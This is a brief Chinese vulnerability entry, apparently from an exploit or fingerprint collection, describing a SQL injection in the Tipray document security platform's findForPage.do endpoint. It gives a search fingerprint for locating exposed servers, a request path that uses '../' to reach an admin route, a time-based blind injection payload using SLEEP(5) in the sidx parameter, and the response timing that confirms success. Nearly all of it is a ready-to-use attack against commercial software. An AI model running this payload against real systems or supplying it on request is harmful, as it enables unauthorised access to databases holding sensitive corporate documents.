# 天锐绿盘文档安全管理平台findForPage.do存在SQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`body="/lddsm/"`
- **请求**：`POST /lddsm/service/../admin/bfclConfig/findForPage.do HTTP/1.1`

**Payload**
```
page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP(5)))x)
```
- **响应特征**：200 响应时间>=5s